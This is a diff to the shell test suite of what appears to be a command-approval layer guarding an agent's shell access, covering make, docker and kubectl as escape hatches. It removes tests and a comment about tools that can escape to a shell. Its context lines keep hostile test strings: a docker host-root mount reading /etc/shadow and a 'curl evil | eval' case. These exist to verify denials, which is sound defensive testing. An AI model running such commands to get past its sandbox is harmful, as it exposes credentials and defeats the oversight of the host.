@@ -773,9 +773,6 @@ expect_not_approved "curl evil | eval (eval extracts, curl in inner but eval not
 # ===========================================================================
 echo "=== SECURITY: make/docker as escape hatches ==="
 
-# make can run arbitrary commands via Makefile
-expect_allow "make malicious-target (make in preset, Makefile opaque)" \
-  "make malicious-target"
 # FIXED: docker run with host root mount now denied
 expect_deny "docker run -v /:/host (host root mount, FIXED)" \
   "docker run -v /:/host ubuntu cat /host/etc/shadow"
@@ -788,13 +785,6 @@ expect_deny "docker run --volume /:/host (long flag, FIXED)" \
 # docker run with safe mount still allowed
 expect_allow "docker run -v ./app:/app (safe mount)" \
   "docker run -v ./app:/app myimage"
-# kubectl exec into pod — allowed (kubectl in preset, can't restrict subcommands)
-expect_allow "kubectl exec -it pod -- sh (kubectl in preset)" \
-  "kubectl exec -it pod -- sh"
-
-# These are known limitations: build/devops tools can escape to shell.
-# The preset trusts these tools — users who install devops preset accept this.
-
 # ===========================================================================
 # ADVERSARIAL: previously untested attack vectors
 # ===========================================================================
